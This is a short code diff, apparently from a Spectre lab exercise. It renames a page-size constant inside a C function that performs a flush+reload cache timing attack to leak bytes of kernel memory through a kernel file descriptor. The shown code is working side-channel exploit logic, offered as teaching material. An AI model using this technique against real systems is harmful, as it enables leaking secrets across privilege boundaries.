@@ -45,7 +45,7 @@ static unsigned char leak_one_byte_part2(int kernel_fd, char *shared_memory, siz
     // FLUSH
     for (int attempt = 0; attempt < ATTEMPTS; attempt++) { // ATTEMPTS defined above, can increase/decrease for fine tuning
         for (int i = 0; i < 256; i++) {
-            clflush(&shared_memory[i * 4096]); // page table size 4096, loop goes through and flushes all pages
+            clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]); // page table size 4096, loop goes through and flushes all pages
         }
 
         // VICTIM
@@ -54,7 +54,7 @@ static unsigned char leak_one_byte_part2(int kernel_fd, char *shared_memory, siz
         // RELOAD 
         for (int i = 0; i < 256; i++) {
             int mix_i = ((i * 167) + 13) & 255; // mixed order to counter prefetching optimization
-            uint64_t dt = time_access(&shared_memory[mix_i * 4096]); // measure access time to mix_i-th page
+            uint64_t dt = time_access(&shared_memory[mix_i * SHD_SPECTRE_LAB_PAGE_SIZE]); // measure access time to mix_i-th page
             access_times[mix_i] = dt;
             if (dt < THRESHOLD) {
                 candidates[mix_i]++;
